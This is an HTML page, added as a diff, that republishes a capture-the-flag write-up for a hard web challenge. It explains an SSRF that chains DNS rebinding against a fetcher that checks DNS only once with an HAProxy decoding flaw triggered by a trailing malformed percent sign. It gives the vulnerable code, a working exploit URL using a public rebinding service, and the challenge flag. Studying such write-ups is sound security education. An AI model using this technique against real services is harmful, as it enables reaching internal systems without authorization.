@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="This challenge combines DNS rebinding with an HAProxy URL-decoding differential. The fetcher approves a public DNS answer but later fetches a private Docker address; a trailing malformed percent sign bypasses HAProxy&#x27;s flag-path block.">
+  <title>ha | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 3 / HARD</p>
+    <h1>ha</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/hard_ssrf/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>This challenge combines DNS rebinding with an HAProxy URL-decoding differential. The fetcher approves a public DNS answer but later fetches a private Docker address; a trailing malformed percent sign bypasses HAProxy's flag-path block.</p>
+<h2>Vulnerable code</h2>
+<p>The fetcher validates DNS only once in <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/hard_ssrf/src/fetcher/app.js"><code>src/fetcher/app.js</code></a>, lines 17-24:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-javascript">const addresses = await dns.lookup(hostname, { all: true });
+for (const addr of addresses) {
+  const ip = ipaddr.parse(addr.address);
+  if (ip.range() === 'loopback' || ip.range() === 'private' || ip.range() === 'linkLocal') {
+    return false;
+  }
+}
+</code></pre>
+<p>It then makes a HEAD request, waits two seconds, and makes a separate GET at lines 39-62. The address checked at the start is not pinned to either connection. A rebinding hostname can therefore return a public address during the check and the internal address later.</p>
+<p>HAProxy should block the flag path in <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/hard_ssrf/src/haproxy/haproxy.cfg"><code>src/haproxy/haproxy.cfg</code></a>, lines 22-24:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-haproxy">acl restricted_flag path_sub,url_dec -m sub -i /flag.txt
+http-request deny if restricted_flag
+</code></pre>
+<p>On the supplied HAProxy 3.2.0, the legacy URL decoder mishandles a malformed final percent sign. The raw path still begins with <code>/internal</code>, so lines 16 and 26 route it to the internal backend; the decoder used by the flag check fails to recognize <code>/flag.txt.</code></p>
+<h2>Exploit</h2>
+<p>Request the fetcher with:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">http://0a64000a.93a80001.rbndr.us/internal/flag.txt%
+</code></pre>
+<p>The rebinding service alternates the public and private hexadecimal addresses. The private address is 10.100.0.10, the HAProxy address from <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/hard_ssrf/src/docker-compose.yaml">src/docker-compose.yaml</a>, lines 30-35.</p>
+<p>When the timing succeeds:</p>
+<ol>
+<li>the DNS check sees the public answer;</li>
+<li>Axios later connects to the internal address;</li>
+<li>HAProxy sees a trusted source in the Docker subnet and routes <code>/internal</code>;</li>
+<li>the malformed percent sign bypasses the decoded flag-path ACL;</li>
+<li>the internal service returns <code>/internal/flag.txt.</code></li>
+</ol>
+<p>The included <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/hard_ssrf/solver.py"><code>solver.py</code></a> uses this exact URL and retries until it wins the rebinding race:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-bash">python solver.py
+</code></pre>
+<p>Set <code>BASE_URL</code> on line 3 to the challenge host if it differs. Retries are expected, not a sign that the payload is wrong.</p>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{d0cker_c0mpse_d3ta1ls_4r3_imp0rtant}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave3">&larr; Back to Wave 3 writeups</a></p>
+  </main>
+</body>
+</html>
